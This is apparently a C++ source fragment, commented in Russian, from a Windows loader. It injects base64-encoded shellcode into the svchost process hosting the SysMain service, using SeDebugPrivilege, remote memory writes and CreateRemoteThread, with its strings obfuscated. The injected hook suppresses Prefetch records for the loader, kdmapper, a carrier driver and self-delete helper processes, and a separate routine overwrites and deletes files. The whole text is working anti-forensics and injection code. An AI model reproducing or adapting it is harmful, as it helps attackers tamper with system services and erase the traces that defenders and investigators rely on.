// Простой base64 декодер
static std::vector<uint8_t> PrefetchMuteBase64Decode(const char* b64) {
    static const char tbl[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<uint8_t> out;
    int val = 0, bits = -8;
    for (const char* p = b64; *p; p++) {
        if (*p == '=' || *p == '\n' || *p == '\r') continue;
        const char* pos = strchr(tbl, *p);
        if (!pos) continue;
        val = (val << 6) + (int)(pos - tbl);
        bits += 6;
        if (bits >= 0) {
            out.push_back((uint8_t)((val >> bits) & 0xFF));
            bits -= 8;
        }
    }
    return out;
}

// Ищем PID процесса svchost.exe, в который загружен sysmain.dll
static DWORD FindSysmainPid() {
    DWORD sysmain_pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPMODULE, 0);
    // Перебираем все процессы, ищем тот у которого модуль sysmain.dll
    HANDLE hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcSnap == INVALID_HANDLE_VALUE) return 0;
    CloseHandle(hSnap);

    PROCESSENTRY32 pe = { sizeof(pe) };
    if (!Process32First(hProcSnap, &pe)) {
        CloseHandle(hProcSnap);
        return 0;
    }
    do {
        // Только svchost.exe
        if (_wcsicmp(pe.szExeFile, xorstr_(L"svchost.exe")) != 0) continue;

        HANDLE hModSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pe.th32ProcessID);
        if (hModSnap == INVALID_HANDLE_VALUE) continue;

        MODULEENTRY32 me = { sizeof(me) };
        if (Module32First(hModSnap, &me)) {
            do {
                if (_wcsicmp(me.szModule, xorstr_(L"sysmain.dll")) == 0) {
                    sysmain_pid = pe.th32ProcessID;
                    break;
                }
            } while (Module32Next(hModSnap, &me));
        }
        CloseHandle(hModSnap);
        if (sysmain_pid) break;
    } while (Process32Next(hProcSnap, &pe));

    CloseHandle(hProcSnap);
    return sysmain_pid;
}

// Отправляем правило фильтра в PrefetchMute через named pipe
static bool SendPrefetchFilterRule(const std::string& rule) {
    HANDLE hPipe = CreateFileA(
        xorstr_("\\\\.\\pipe\\Prefetch_Rule_Pipe"),
        GENERIC_WRITE, 0, nullptr,
        OPEN_EXISTING, 0, nullptr);
    if (hPipe == INVALID_HANDLE_VALUE) return false;
    DWORD written = 0;
    WriteFile(hPipe, rule.c_str(), (DWORD)rule.size(), &written, nullptr);
    CloseHandle(hPipe);
    return written == (DWORD)rule.size();
}

static bool g_prefetch_mute_injected = false;

// Главная функция: инжектируем PrefetchMuteHook шеллкод в svchost (Sysmain)
static void InjectPrefetchMuteHook() {
    // Если уже инжектировали — только обновляем правило
    if (g_prefetch_mute_injected) goto send_rule;

    {
        // Получаем байты шеллкода из base64
        std::vector<uint8_t> hook_bytes = PrefetchMuteBase64Decode(PREFETCH_MUTE_B64);
        if (hook_bytes.empty()) return;

        // Ищем svchost+Sysmain
        DWORD pid = FindSysmainPid();
        if (!pid) return;

        // Включаем SeDebugPrivilege
        HANDLE hToken = nullptr;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
            LUID luid;
            if (LookupPrivilegeValueA(nullptr, xorstr_("SeDebugPrivilege"), &luid)) {
                TOKEN_PRIVILEGES tp = {};
                tp.PrivilegeCount = 1;
                tp.Privileges[0].Luid = luid;
                tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
            }
            CloseHandle(hToken);
        }

        // Открываем процесс
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess) return;

        // Выделяем память в svchost
        LPVOID lpBuf = VirtualAllocEx(
            hProcess, nullptr, hook_bytes.size(),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!lpBuf) { CloseHandle(hProcess); return; }

        // Пишем шеллкод
        SIZE_T written = 0;
        if (!WriteProcessMemory(hProcess, lpBuf, hook_bytes.data(), hook_bytes.size(), &written)
            || written != hook_bytes.size()) {
            VirtualFreeEx(hProcess, lpBuf, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return;
        }

        // Запускаем в удалённом потоке — DllMain вызывается сам,
        // он ставит хук и стартует трубу для правил
        HANDLE hThread = CreateRemoteThread(
            hProcess, nullptr, 0,
            (LPTHREAD_START_ROUTINE)lpBuf, nullptr, 0, nullptr);
        if (hThread) {
            // Ждём не более 3 секунд пока хук встанет и поднимет pipe
            WaitForSingleObject(hThread, 3000);
            CloseHandle(hThread);
            g_prefetch_mute_injected = true;
        }
        CloseHandle(hProcess);

        // Небольшая пауза — pipe в DLL поднимается в отдельном потоке
        Sleep(500);
    }

send_rule:
    {
        // Отправляем имя нашего exe как правило фильтра (uppercase, как ожидает DLL)
        char buf[MAX_PATH] = {};
        GetModuleFileNameA(nullptr, buf, MAX_PATH);
        std::string exe_path(buf);
        size_t sl = exe_path.find_last_of('\\');
        std::string exe_name = (sl != std::string::npos) ? exe_path.substr(sl + 1) : exe_path;
        for (auto& c : exe_name) c = (char)toupper((unsigned char)c);
        SendPrefetchFilterRule(exe_name);

        // kdmapper and the carrier driver, plus the child processes the loader
        // still spawns (the self-delete cmd/ping), so their .pf files are not
        // created either.
        SendPrefetchFilterRule(xorstr_("KDMAPPER"));
        SendPrefetchFilterRule(xorstr_("PDFWKRNL"));
        SendPrefetchFilterRule(xorstr_("CMD.EXE"));
        SendPrefetchFilterRule(xorstr_("PING.EXE"));
        SendPrefetchFilterRule(xorstr_("SETX.EXE"));
    }
}

// Безопасно удаляет файл (overwrite 1 pass → delete)
static void SafeWipeFile(const std::string& path) {
    if (GetFileAttributesA(path.c_str()) == INVALID_FILE_ATTRIBUTES) return;
    HANDLE hF = CreateFileA(path.c_str(), GENERIC_WRITE, 0, nullptr,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hF != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER fsz = {}; GetFileSizeEx(hF, &fsz);
        if (fsz.QuadPart > 0) {
            std::vector<BYTE> z(min((LONGLONG)65536, fsz.QuadPart), 0);
            LARGE_INTEGER zero = {}; SetFilePointerEx(hF, zero, nullptr, FILE_BEGIN);
            DWORD wr;
            for (LONGLONG off = 0; off < fsz.QuadPart; off += (LONGLONG)z.size())
                WriteFile(hF, z.data(), (DWORD)z.size(), &wr, nullptr);
            SetEndOfFile(hF);
        }
        CloseHandle(hF);
    }
    DeleteFileA(path.c_str());
}

